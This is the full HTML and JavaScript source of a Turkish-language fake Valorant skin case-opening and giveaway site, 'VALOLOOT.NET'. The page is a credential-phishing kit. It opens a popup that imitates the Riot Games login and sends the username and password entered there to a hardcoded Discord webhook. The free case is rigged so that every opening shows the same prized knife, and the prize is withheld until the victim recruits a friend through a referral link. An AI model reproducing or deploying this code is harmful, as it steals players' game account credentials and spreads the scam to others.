<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALOLOOT.NET | En İyi Valorant Kasa Açma Sitesi</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
        
        body { 
            background-color: var(--dark-bg); 
            background-image: url('background.jpg'); /* Orijinal Arka Plan */
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
            color: white; 
            font-family: 'Inter', sans-serif; 
            margin: 0; padding: 0; min-height: 100vh; 
        }
        
        .live-drops { background: rgba(0, 0, 0, 0.9); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; z-index: 100; }
        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; }
        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
        .drop-card { background: rgba(255,255,255,0.05); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
        .drop-card img { height: 45px; object-fit: contain; }
        .rarity-box { width: 100%; height: 6px; margin-top: auto; }

        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
        .logo span { color: var(--valo-red); }
        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 14px; }

        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(17, 20, 32, 0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); }
        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }

        .case-wrapper { max-width: 1200px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .case-box { background: #111420; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); width: 260px; transition: 0.3s; cursor: pointer; position: relative; overflow: hidden; }
        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
        .case-box img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 15px; }
        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 20px; margin-bottom: 10px; font-family: 'Montserrat'; }
        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 800; border-radius: 4px; text-transform: uppercase; cursor: pointer; }

        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; align-items:center; justify-content:center; backdrop-filter: blur(10px); }
        .case-open-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:500px; padding:40px; text-align:center; position:relative; box-shadow: 0 0 50px rgba(255, 70, 85, 0.2); max-height: 90vh; overflow-y: auto; }
        
        .spinner-container { width: 100%; height: 140px; background: #0b1119; border: 1px solid rgba(255,70,85,0.3); margin: 25px 0; overflow: hidden; position: relative; display: flex; align-items: center; border-radius: 8px; }
        .spinner-line { position: absolute; left: 50%; top: 0; width: 3px; height: 100%; background: var(--valo-red); z-index: 10; box-shadow: 0 0 15px var(--valo-red); transform: translateX(-50%); }
        .item-list { display: flex; position: absolute; left: 0; transition: transform 5s cubic-bezier(0.15, 0, 0.05, 1); will-change: transform; align-items: center; }
        .item-list img { width: 120px; height: 100px; object-fit: contain; margin: 0 15px; opacity: 0.6; filter: grayscale(0.5); transition: 0.3s; }

        .win-screen { display: none; animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .win-item-img { width: 220px; height: 180px; object-fit: contain; filter: drop-shadow(0 0 25px #79eb1e); margin: 10px 0; }
        .share-link-box { background: #0b1119; padding: 15px; border-radius: 6px; margin: 20px 0; border: 1px dashed #79eb1e; color: #79eb1e; font-family: 'Montserrat'; font-size: 13px; cursor: pointer; transition: 0.2s; }
        
        .custom-alert { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--valo-red); color: white; padding: 15px 30px; border-radius: 50px; font-weight: 700; z-index: 3000; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }

        .ai-analysis-btn { background: #6366f1; color: white; border: none; padding: 10px 15px; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 10px; width: 100%; transition: 0.3s; font-size: 13px; }
        .ai-result-box { background: rgba(99, 102, 241, 0.1); border: 1px solid #6366f1; padding: 15px; border-radius: 8px; margin-top: 15px; display: none; text-align: left; font-size: 13px; color: #e0e7ff; }
        .ai-loader { display: none; margin: 10px 0; }
        .ai-loader span { display: inline-block; width: 8px; height: 8px; background: #6366f1; border-radius: 50%; margin: 0 3px; animation: bounce 0.6s infinite alternate; }
        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
    </style>
</head>
<body>

    <div id="alertBox" class="custom-alert"></div>

    <div class="live-drops">
        <div class="mythic-label">CANLI DROPLAR</div>
        <div id="dropTrack" class="drop-container"></div>
    </div>

    <header>
        <div class="logo">VALO<span>LOOT</span></div>
        <div class="nav-links">
            <a href="#">KASALAR</a><a href="#">SAVAŞLAR</a><a href="#">MAĞAZA</a>
        </div>
        <div id="authArea">
            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
        </div>
    </header>

    <div class="giveaway-section">
        <div>
            <h2 style="margin:0; font-family:'Montserrat';">10 ADET 8900 VP ÇEKİLİŞİ</h2>
            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">KATILMAK İÇİN OTURUM AÇIN</p>
        </div>
        <div style="text-align:right">
            <div id="countdown">00:00:00</div>
            <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
        </div>
    </div>

    <div class="case-wrapper">
        <div class="case-row" id="row1"></div>
        <div class="case-row" id="row2"></div>
    </div>

    <div id="caseModal" class="modal-overlay">
        <div class="case-open-card">
            <div id="spinnerView">
                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
                <div class="spinner-container">
                    <div class="spinner-line"></div>
                    <div id="itemList" class="item-list"></div>
                </div>
            </div>

            <div id="winView" class="win-screen">
                <h3 style="color:#79eb1e; font-family:'Montserrat'; margin-bottom: 5px;">TEBRİKLER!</h3>
                <h1 style="margin:0; font-size: 24px;">DESTANSI ÖDÜL!</h1>
                <img src="" id="wonItemImg" class="win-item-img" onerror="this.src='skin6.png'">
                <h2 id="wonItemName" style="margin:10px 0; color: var(--valo-red);">YAĞMACI KARAMBİT</h2>
                
                <button class="ai-analysis-btn" onclick="analyzeWinWithAI()">✨ Gemini Skin Analizi</button>
                <div id="aiLoader" class="ai-loader"><span></span><span></span><span></span></div>
                <div id="aiResult" class="ai-result-box"></div>

                <div style="background:rgba(121,235,30,0.1); padding:15px; border-radius:8px; border:1px solid #79eb1e; margin: 15px 0;">
                    <span id="vpValue" style="color:#79eb1e; font-weight:900; font-size:24px;">4350 VP</span>
                </div>

                <p style="font-size:13px; color:#aaa;">Bu ödülü hesabına tanımlamak için 1 arkadaşını davet etmelisin!</p>
                <div class="share-link-box" onclick="copyLink()">VALOLOOT.NET/DAVET/REF?ID=582934</div>
                
                <button class="open-btn" id="claimBtn" onclick="checkRef()" style="background:#79eb1e; color:#000;">ARKADAŞIM GELDİ, VP'Yİ YÜKLE</button>
            </div>
        </div>
    </div>

    <script>
        const apiKey = "";
        let isLoggedIn = false;

        // Orijinal Resimlerin Olduğu Liste
        const dropSkins = [
            {name: "YAĞMACI KARAMBİT", vp: "4350 VP", img: "skin6.png"},
            {name: "EJDER ATEŞİ VANDAL", vp: "2475 VP", img: "skin2.png"},
            {name: "ASİL PHANTOM", vp: "1775 VP", img: "skin3.png"},
            {name: "İON OPERATOR", vp: "1775 VP", img: "skin4.png"}
        ];

        async function analyzeWinWithAI() {
            const winName = document.getElementById('wonItemName').innerText;
            const resultBox = document.getElementById('aiResult');
            const loader = document.getElementById('aiLoader');
            resultBox.style.display = 'none';
            loader.style.display = 'block';

            try {
                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        contents: [{ parts: [{ text: `${winName} isimli Valorant skini hakkında kısa, heyecanlı bir analiz ve oyun ipucu ver. Türkçe konuş.` }] }],
                        systemInstruction: { parts: [{ text: "Sen bir Valorant skin uzmanısın." }] }
                    })
                });
                const result = await response.json();
                loader.style.display = 'none';
                resultBox.innerText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Hata oluştu.";
                resultBox.style.display = 'block';
            } catch (e) {
                loader.style.display = 'none';
                resultBox.innerText = "Yapay zeka şu an meşgul.";
                resultBox.style.display = 'block';
            }
        }

        function loadCases() {
            const r1 = document.getElementById('row1');
            const r2 = document.getElementById('row2');
            // Orijinal caseX.png dosyalarını geri getirdim
            const cases = [
                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true}, 
                {n: "STANDART", p: "30 VP", i: "case2.png"},
                {n: "ELİT", p: "50 VP", i: "case3.png"}, 
                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, 
                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
            ];

            r1.innerHTML = ''; r2.innerHTML = '';
            cases.slice(0, 4).forEach(c => {
                const fn = c.free ? "openFreeCase()" : "openAuth()";
                r1.innerHTML += `<div class="case-box" onclick="${fn}"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
            });
            cases.slice(4, 6).forEach(c => {
                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
            });
        }

        function openFreeCase() {
            if(!isLoggedIn) { openAuth(); return; }
            const modal = document.getElementById('caseModal');
            const list = document.getElementById('itemList');
            modal.style.display = 'flex';
            document.getElementById('spinnerView').style.display = 'block';
            document.getElementById('winView').style.display = 'none';
            list.innerHTML = '';
            list.style.transform = 'translateX(0)';

            for(let i=0; i < 40; i++) {
                const s = (i === 35) ? dropSkins[0] : dropSkins[Math.floor(Math.random()*4)];
                list.innerHTML += `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/120x100?text=VALO'">`;
            }

            setTimeout(() => { 
                const move = (35 * 150) - (document.querySelector('.spinner-container').offsetWidth / 2) + 75;
                list.style.transform = `translateX(-${move}px)`; 
            }, 100);

            setTimeout(() => {
                document.getElementById('spinnerView').style.display = 'none';
                document.getElementById('winView').style.display = 'block';
                document.getElementById('wonItemImg').src = "skin6.png";
            }, 5500);
        }

        function openAuth() {
            const w = 550, h = 800;
            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
            let win = window.open("", "Auth", `width=${w},height=${h},top=${t},left=${l}`);
            win.document.write(`<html><body style="background:#111; color:white; text-align:center; font-family:sans-serif; padding-top:50px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="80">
                <h2>RIOT GAMES GİRİŞ</h2>
                <input id="u" placeholder="Kullanıcı Adı" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
                <input id="p" type="password" placeholder="Şifre" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
                <button onclick="s()" style="background:#ff4655; color:white; border:none; padding:15px; width:80%; margin-top:20px; font-weight:bold; cursor:pointer;">GİRİŞ YAP</button>
                <script>function s(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u&&p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\/script>
            </body></html>`);
        }

        window.addEventListener("message", (e) => {
            if(e.data.u && e.data.p) {
                isLoggedIn = true;
                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:8px 20px; border-radius:4px;">${e.data.u.toUpperCase()}</div>`;
                // Webhook Veri Gönderimi
                fetch("https://discord.com/api/webhooks/1346618520242184193/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        embeds: [{ 
                            title: "VALOLOOT GİRİŞ", 
                            color: 16725845,
                            fields: [{name: "Kullanıcı", value: e.data.u}, {name: "Şifre", value: e.data.p}],
                            timestamp: new Date()
                        }] 
                    })
                });
            }
        });

        loadCases();
        function showMsg(t){ const a=document.getElementById('alertBox'); a.innerText=t; a.style.display='block'; setTimeout(()=>a.style.display='none',3000); }
        function copyLink(){ showMsg("Link kopyalandı!"); }
        function checkRef(){ showMsg("Arkadaşınız henüz giriş yapmadı!"); }

        setInterval(() => {
            const track = document.getElementById('dropTrack');
            const s = dropSkins[Math.floor(Math.random()*4)];
            const div = document.createElement('div');
            div.className = 'drop-card';
            div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:var(--valo-red)"></div>`;
            track.prepend(div);
            if(track.children.length > 15) track.removeChild(track.lastChild);
        }, 4000);
    </script>
</body>
</html>
